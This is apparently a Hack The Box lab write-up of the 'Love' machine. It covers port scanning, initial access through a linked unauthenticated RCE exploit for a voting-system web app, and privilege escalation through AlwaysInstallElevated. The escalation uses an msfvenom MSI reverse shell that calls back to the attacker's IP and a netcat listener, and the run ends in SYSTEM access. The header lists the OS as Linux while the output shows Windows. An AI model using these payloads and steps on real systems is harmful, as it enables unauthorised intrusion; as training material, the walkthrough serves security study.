

# HTB: Love
**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Love)  
**Difficulty:** `Easy`  
**OS:** `Linux`  
---

## Reconnaissance

Today , we will hack a romantic machine from HackTheBox named Love in Easy difficulty.

Starting reconnaissance phase with rustscan, My nmap scan is too slow and take so much time . Thats why i skipped nmap.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Love]
└─$ cat rustscan.out             
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.48.103:80
Open 10.129.48.103:135
Open 10.129.48.103:139
Open 10.129.48.103:3306
Open 10.129.48.103:5000
Open 10.129.48.103:5040
Open 10.129.48.103:445
Open 10.129.48.103:443
Open 10.129.48.103:5985
Open 10.129.48.103:5986
Open 10.129.48.103:7680
Open 10.129.48.103:47001
Open 10.129.48.103:49664
Open 10.129.48.103:49665
Open 10.129.48.103:49667
Open 10.129.48.103:49666
Open 10.129.48.103:49668
Open 10.129.48.103:49670
Open 10.129.48.103:49669
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 16:04 +0400
Initiating Ping Scan at 16:04
Scanning 10.129.48.103 [4 ports]
Completed Ping Scan at 16:04, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:04
Completed Parallel DNS resolution of 1 host. at 16:04, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:04
Scanning 10.129.48.103 [19 ports]
Discovered open port 445/tcp on 10.129.48.103
Discovered open port 3306/tcp on 10.129.48.103
Discovered open port 135/tcp on 10.129.48.103
Discovered open port 139/tcp on 10.129.48.103
Discovered open port 80/tcp on 10.129.48.103
Discovered open port 49665/tcp on 10.129.48.103
Discovered open port 443/tcp on 10.129.48.103
Discovered open port 5986/tcp on 10.129.48.103
Discovered open port 5000/tcp on 10.129.48.103
Discovered open port 49669/tcp on 10.129.48.103
Discovered open port 47001/tcp on 10.129.48.103
Discovered open port 7680/tcp on 10.129.48.103
Discovered open port 5040/tcp on 10.129.48.103
Discovered open port 49670/tcp on 10.129.48.103
Discovered open port 49664/tcp on 10.129.48.103
Discovered open port 5985/tcp on 10.129.48.103
Discovered open port 49666/tcp on 10.129.48.103
Discovered open port 49667/tcp on 10.129.48.103
Discovered open port 49668/tcp on 10.129.48.103
Completed SYN Stealth Scan at 16:04, 0.36s elapsed (19 total ports)
Nmap scan report for 10.129.48.103
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2026-04-07 16:04:34 +04 for 0s

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
3306/tcp  open  mysql        syn-ack ttl 127
5000/tcp  open  upnp         syn-ack ttl 127
5040/tcp  open  unknown      syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
5986/tcp  open  wsmans       syn-ack ttl 127
7680/tcp  open  pando-pub    syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
           Raw packets sent: 23 (988B) | Rcvd: 20 (864B)

```

Perfect , Lets start with port 80 first.

## Enumeration

On Web page , we see that Voting System runs on port 80 and it requires authentication. But we have no credentials due to black box pentesting , We have to search on Internet for its exploit if exists.

https://github.com/SamSepiolProxy/Voting-System-1.0-Unauth-RCE/blob/main/exploit.py  Here we found related exploit to this service and lets check if it is correct or not.

```bash
└─$ rlwrap nc -lnvp 9001                                  
listening on [any] 9001 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.48.103] 59793
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>
```

After running exploit ,  We got our initial Access


## Privilege Escalation

ON target, We used WinPeas tool (automatic privilege escalation tool) to find out any misconfiguration or potential way to privilege escalation.

Perfect , we identified AlwaysInstalledElevated is ON via checking as this-> 

```bash
C:\xampp\htdocs\omrs\images>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\xampp\htdocs\omrs\images>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

```

To abuse this on our malicious purpose , we have generate our payload , then transfer to target and then trigger payload to got our admin shell

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Love]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.54 LPORT=9002 -f msi -o payload.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: payload.msi
```

Then transfer and trigger -> 

```bash
C:\temp>msiexec /quiet /qn /i payload.msi
msiexec /quiet /qn /i payload.msi
```

Then wait for connection back 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Love]
└─$ rlwrap nc -lnvp 9002                                  
listening on [any] 9002 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.48.103] 53269
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>
```

And Boom , We are super root.

Thanks for Attention).
